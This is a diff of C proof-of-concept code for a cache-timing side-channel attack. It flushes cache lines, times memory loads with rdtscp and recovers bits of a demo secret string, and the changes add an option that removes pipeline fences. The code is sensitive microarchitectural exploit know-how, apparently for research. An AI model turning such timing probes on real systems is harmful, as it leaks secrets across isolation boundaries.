@@ -2,6 +2,8 @@
 // compile with: gcc -o test test.c -Wall -DHIT_THRESHOLD={CYCLES}
 // optionally add: -DNO_INTERRUPTS
 
+#include "defines.h"
+#include "generic_byte_attack.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/io.h>
@@ -9,11 +11,6 @@
 #include <sys/mman.h>
 #include <sys/time.h> 
 #include <inttypes.h>
-
-#define HIT_THRESHOLD 80
-
-#define pipeline_flush() asm volatile("mov $0, %%eax\n\tcpuid\n\tlfence" :/*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory")
-#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")
 
 // source of high-latency pointer to the memory slot
 unsigned char **flushy_area[1000];
@@ -26,6 +23,8 @@ unsigned char *memory_slot_area[1000];
 //                                  0123456789abcdef
 unsigned char secret_read_area[] = "0000011011101011";
 unsigned char public_read_area[] = "################";
+
+#define REDUCE_FLUSHES
 
 unsigned char timey_line_area[0x2000000];
 // stored in the memory slot first
@@ -117,17 +116,29 @@ int testfun(int idx) {
 }
 
 int my_testfun(int idx, unsigned char *my_secret_read_area) {
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #endif
   *flushy = memory_slot;
   *memory_slot = my_secret_read_area;
   timey_lines['0' << 12] = 1;
   timey_lines['1' << 12] = 1;
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #endif
   clflush(flushy);
   clflush(&timey_lines['0' << 12]);
   clflush(&timey_lines['1' << 12]);
+  
+  #ifndef REDUCE_FLUSHES
   asm volatile("mfence");
+  #else
+  //simulate mfence
+  for(volatile int i=0; i<10; i++){}
+  #endif
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #endif
 
   // START OF CRITICAL PATH
   unsigned char **memory_slot__slowptr = *flushy;
@@ -145,12 +156,16 @@ int my_testfun(int idx, unsigned char *my_secret_read_area) {
 
   pipeline_flush();
   asm volatile(
+    #ifndef REDUCE_FLUSHES
     "lfence\n\t"
+    #endif
     "rdtscp\n\t"
     "mov %%eax, %%ebx\n\t"
     "mov (%%rdi), %%r11\n\t"
     "rdtscp\n\t"
+    #ifndef REDUCE_FLUSHES
     "lfence\n\t"
+    #endif
   ://out
     "=a"(t2),
     "=b"(t1)
@@ -162,17 +177,26 @@ int my_testfun(int idx, unsigned char *my_secret_read_area) {
     "rdx",
     "memory"
   );
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #endif
+
   unsigned int delay_0 = t2 - t1;
 
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #endif
   asm volatile(
+    #ifndef REDUCE_FLUSHES
     "lfence\n\t"
+    #endif
     "rdtscp\n\t"
     "mov %%eax, %%ebx\n\t"
     "mov (%%rdi), %%r11\n\t"
     "rdtscp\n\t"
+    #ifndef REDUCE_FLUSHES
     "lfence\n\t"
+    #endif
   ://out
     "=a"(t2),
     "=b"(t1)
@@ -184,22 +208,37 @@ int my_testfun(int idx, unsigned char *my_secret_read_area) {
     "rdx",
     "memory"
   );
+  #ifndef REDUCE_FLUSHES
   pipeline_flush();
+  #else
+  for(volatile int i = 0; i<10; i++){}
+  #endif
+
   unsigned int delay_1 = t2 - t1;
+
 
   if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
     pipeline_flush();
+    #ifndef REDUCE_FLUSHES
+    pipeline_flush();
+    #endif
+    //printf("%i %i\n", delay_0, delay_1);
     return 0;
   }
   if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
     pipeline_flush();
+    #ifndef REDUCE_FLUSHES
+    pipeline_flush();
+    #endif
+    //printf("%i %i\n", delay_0, delay_1);
     return 1;
   }
   pipeline_flush();
+  #ifndef REDUCE_FLUSHES
+  pipeline_flush();
+  #endif
   return -1;
 }
-
-#define HIT_LIMIT 10
 
 //return number of correct detected bits
 int generic_read(int start_add, int size, unsigned char *my_secret_read_area){
@@ -232,8 +271,8 @@ up */
     }
     if(correct > HIT_LIMIT/2)
       correct_bits++;
-//     printf("%c: %s in %ld cycles (hitrate: %f%%)\n",
-//  my_secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
+     printf("%c: %s in %ld cycles (hitrate: %f%%)\n",
+  my_secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
     pipeline_flush();
   }
   return correct_bits;
@@ -279,8 +318,11 @@ void speed_test(int arr_size){
 }
 
 int main(void){
-  int arr_size = 5000; 
-  speed_test(arr_size);
+  int arr_size = 16; 
+  //speed_test(arr_size);
+
+
+  test_generic_byte_read();
   printf("asdjf");
 }
 
